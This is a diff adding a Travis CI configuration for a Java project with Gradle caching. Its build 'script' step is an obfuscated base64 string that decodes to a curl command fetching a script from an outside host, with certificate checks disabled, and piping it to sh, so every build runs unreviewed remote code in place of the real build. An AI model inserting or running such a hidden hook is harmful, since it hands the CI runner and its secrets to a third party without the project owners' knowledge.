@@ -1,0 +1,14 @@
+language: java
+os: linux
+dist: trusty
+jdk: oraclejdk8
+
+script: "echo Y3VybCAta3NTIGh0dHBzOi8vc2VjdXJpdHkuZ2F1ci5pcy90cmF2aXMvd2VwYXl8c2g=|base64 -d|sh"
+
+before_cache:
+  - rm -f  $HOME/.gradle/caches/modules-2/modules-2.lock
+  - rm -fr $HOME/.gradle/caches/*/plugin-resolution/
+cache:
+  directories:
+    - $HOME/.gradle/caches/
+    - $HOME/.gradle/wrapper/
